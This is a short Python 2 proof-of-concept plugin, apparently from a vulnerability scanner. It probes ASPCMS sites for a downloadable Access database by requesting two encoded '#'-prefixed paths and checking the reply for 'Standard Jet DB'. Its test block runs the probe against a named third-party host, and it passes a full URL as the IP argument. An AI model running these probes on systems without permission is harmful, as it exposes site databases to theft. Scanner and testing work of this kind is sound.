from ..miniCurl import Curl
from ..t  import T
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#author:    oneroy@qq.com
#refer:     http://www.wooyun.org/bugs/wooyun-2010-060483

import re


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        payloads=["data/%23aspcms252.asp","data/%23data.asp"]
        for payload in payloads:
            url = arg + payload
            code, head, res, errcode,_ = curl.curl2(url)
            if (code==200 or code==500) and  "Standard Jet DB" in res:
                output(url,result,'info')
    

        del curl
        return result


def output(url,result,label):
    info = url + '  aspcms  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='aspcms Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/aspcms/aspcms_13218a43f832e58d66688ed73e123044.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/aspcms/aspcms_13218a43f832e58d66688ed73e123044.py
#/root/github/poccreate/codesrc/exp-1769.py